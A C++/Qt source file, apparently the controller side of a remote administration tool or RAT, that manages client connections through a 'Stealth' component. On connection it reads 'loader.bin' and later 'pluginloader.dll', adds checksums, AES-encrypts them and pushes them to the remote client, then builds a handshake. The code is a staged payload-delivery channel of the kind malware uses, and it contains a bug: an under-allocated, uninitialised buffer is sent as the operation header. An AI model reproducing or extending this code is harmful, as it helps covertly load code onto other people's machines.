#include "connectionmanager.h"

ConnectionManager::ConnectionManager(Stealth* stealth,MessageManager* mngMessage,QObject* parent) : QObject(parent)
{
    this->mngMessage=mngMessage;
    this->stealth=stealth;

    connect(this,SIGNAL(connectionEstablished(Connection*)),this,SLOT(addConnection(Connection*)));
    connect(mngMessage,SIGNAL(receivedHandshake(Connection*)),this,SLOT(processHandshake(Connection*)));
    connect(mngMessage,SIGNAL(receivedLoaderOk(Connection*)),this,SLOT(sendPluginManager(Connection*)));
}

void ConnectionManager::sendLoader(Connection *connection)
{

    if(connection->getState()==Connection::JustConnected)
    {
        connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));

        /* Carga desde archivo */
        QFile fileLoader("loader.bin");
        if(!fileLoader.open(QIODevice::ReadOnly)) return;
        QByteArray Loader=fileLoader.readAll();
        fileLoader.close();

        QByteArray checkSum=Crypto::FNV1a(Loader);
        Loader.insert(0,checkSum);
        QByteArray crypted=Crypto::AES(connection->getIV(),connection->getKey(),Loader);

        connection->write(connection->getIV().toByteArray()+crypted);

        connection->setState(Connection::WaitingForLoader);
    }
}

void ConnectionManager::sendPluginManager(Connection *connection)
{
    QFile filePluginLoader("pluginloader.dll");
    if(!filePluginLoader.open(QIODevice::ReadOnly)) return;
    QByteArray PluginLoader=filePluginLoader.readAll();
    filePluginLoader.close();


    quint32 pluginmanagerSize=PluginLoader.size();
    PluginLoader.insert(0,(char*)&pluginmanagerSize,4);
    QByteArray checkSum=Crypto::FNV1a(PluginLoader);
    PluginLoader.insert(0,checkSum);
    QByteArray crypted=Crypto::AES(connection->getIV(),connection->getKey(),PluginLoader);
    connection->write(crypted);

    connection->setState(Connection::WaitingForGreeting);
}

void ConnectionManager::processHandshake(Connection* connection)
{
    //FIXME: Reestablecer a WaitingForGreeting?
    if(connection->getState()!=Connection::ReadingGreeting) return;
    if(connection->Data.size()!=connection->NextBlockHeader.Size.Bytes) return;

    //Guardamos el HandShake
    connection->HandShake=*(Connection::RPEP_SERVER_HANDSHAKE*)connection->Data.data();

    Connection::RPEP_CLIENT_HANDSHAKE* ClientHandShake;

    //FIXME: Definir númro de puertos correcto
#define NUM_PORTS 1

    ClientHandShake=(Connection::RPEP_CLIENT_HANDSHAKE*)malloc(
                sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS
                );

    ClientHandShake->CompressionALGM=connection->HandShake.SupportedCompressionAlgm[0];
    ClientHandShake->MaxBlockSize=connection->HandShake.MaxBlockSize;
    ClientHandShake->Port[0]=2000;
    ClientHandShake->PortCount=NUM_PORTS;
    ClientHandShake->Version.High=1;
    ClientHandShake->Version.Low=0;


    Connection::RPEP_HEADER::_OperationType* Operation=(Connection::RPEP_HEADER::_OperationType*)malloc(sizeof(Connection::RPEP_HEADER::_OperationType*));

    connection->send(Operation,(char*)ClientHandShake,sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS);

    free(ClientHandShake);
    free(Operation);
}

void ConnectionManager::addConnection(Connection* connection)
{
    Connections.append(connection);
}
